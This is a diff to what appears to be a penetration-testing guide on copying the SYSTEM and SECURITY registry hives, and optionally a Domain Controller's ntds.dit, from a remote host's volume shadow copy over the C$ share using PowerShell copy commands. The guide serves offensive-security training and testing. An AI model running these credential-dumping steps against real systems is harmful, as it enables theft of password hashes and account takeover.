@@ -89,7 +89,7 @@ PS C:\> $p = '\\{0}\C$\{1}\Windows\System32\config' -f $h,$c.InstallDate.ToUnive
 PS C:\> $p
 \\DC01.mydomain.local\C$\@GMT-2020.04.19-19.34.01\Windows\System32\config
 ```
-After compiling the path we will copy the required files using the copy command to our local disk (in this case `C:\tmp`). Because creating the shadow copy might take a while when attempting to copy the files from the shadow copy path too quickly, it will result in an error that the path does not exist. In that case wait a bit and try again. In case you want to obtain the password hashes from a Domain Controller, this approach can also be used to remotely obtain the `ntds.dit` file from the (by default) `%SystemRoot%\NTDS` folder.
+After compiling the path we will copy the required files using the copy command to our local disk (in this case `C:\tmp`). Because creating the shadow copy might take a while when attempting to copy the files from the shadow copy path too quickly, it will result in an error that the path does not exist. In that case wait a bit and try again. Alternatively, in case you are logged in interactively, open the Properties of the `C$` share of the victim host in Windows Explorer and click Open for the shadow copy you created. In case you want to obtain the password hashes from a Domain Controller, this approach can also be used to remotely obtain the `ntds.dit` file from the (by default) `%SystemRoot%\NTDS` folder.
 ```powershell
 PS C:\> copy $p\SYSTEM C:\tmp
 PS C:\> copy $p\SECURITY C:\tmp
